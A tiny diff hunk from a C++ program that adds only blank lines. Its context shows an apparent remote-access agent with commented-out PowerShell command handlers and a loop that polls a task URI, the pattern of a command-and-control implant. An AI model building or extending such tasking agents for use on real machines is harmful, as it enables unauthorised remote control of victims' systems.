@@ -30,6 +30,13 @@ int main()
 	//cmdHandler.RegisterCommand(POWERSHELL_CMD, std::bind(&Agent::powershell, agent));
 	//cmdHandler.RegisterCommand(PSIMPORT_CMD, std::bind(&Agent::psimport, agent));
 
+
+
+
+
+
+
+
 	while (true) {
 		std::string task = agent.Get(TASK_URI);
 
